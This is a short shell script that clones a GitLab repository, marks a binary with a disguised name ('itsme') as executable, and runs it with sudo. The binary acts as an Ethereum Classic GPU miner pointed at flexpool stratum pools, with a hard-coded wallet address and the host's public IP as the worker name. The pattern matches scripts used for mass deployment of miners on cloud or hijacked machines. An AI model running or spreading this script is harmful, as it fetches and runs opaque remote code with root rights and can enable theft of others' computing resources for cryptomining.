#!/bin/sh
sudo apt update
sudo apt-get install zip unzip
sudo apt install screen -y
screen -dmS baldatunect.sh 65 75
sudo git clone https://gitlab.com/taufiqurrohmanmaz/sunmorany.git
cd sunmorany
chmod +x itsme
ip=$(echo "$(curl -s ifconfig.me)" | tr . _ ) &&  sudo ./itsme -a ethash -w 0xf53472b6f7a30d6f6f84cf2e85f29f3bc78a2ef7 -p stratum+tcp://etc-sg.flexpool.io:48607 stratum+tcp://etc-us-east.flexpool.io:48607 -r $ip --nvidia 1
